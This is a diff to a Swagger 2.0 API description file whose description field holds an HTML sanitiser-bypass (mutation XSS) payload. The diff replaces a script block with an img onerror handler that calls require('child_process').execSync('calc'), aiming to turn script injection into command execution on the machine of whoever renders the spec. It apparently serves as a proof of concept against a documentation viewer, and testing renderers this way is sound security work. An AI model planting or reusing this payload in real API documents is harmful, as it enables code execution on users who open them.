@@ -2,15 +2,8 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |   
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(myFunction()) src=1>">
-                <script type="text/javascript">
-                    function myFunction() {
-                      debugger;
-                      alert('ddddddd') 
-                      console.log('yyyyy') 
-                    }
-                    myFunction();
-                </script>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>
+        <img src=x onerror="alert(require('child_process').execSync('calc').toString());">
     </form>
         
   version: production
